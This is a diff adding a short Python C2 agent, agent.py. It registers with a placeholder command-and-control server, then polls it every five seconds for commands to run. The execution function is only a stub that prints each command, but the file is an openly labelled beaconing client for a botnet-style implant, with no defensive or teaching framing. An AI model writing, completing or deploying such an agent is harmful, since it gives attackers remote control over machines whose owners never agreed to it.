@@ -1,0 +1,29 @@
+agent.py
+
+import requests
+import json
+import time
+
+AGENT_ID = "unique_agent_id"
+CNC_SERVER = "http://your_cnc_server_ip:5000"
+
+def register():
+    data = {"agent_id": AGENT_ID}
+    response = requests.post(f"{CNC_SERVER}/register", json=data)
+    return response.json()
+
+def receive_commands():
+    while True:
+        response = requests.get(f"{CNC_SERVER}/command?agent_id={AGENT_ID}")
+        cmd = response.json().get('command')
+        if cmd:
+            execute_command(cmd)
+        time.sleep(5)
+
+def execute_command(cmd):
+    # Exécuter la commande reçue
+    print(f"Executing command: {cmd}")
+
+if __name__ == '__main__':
+    register()
+    receive_commands()
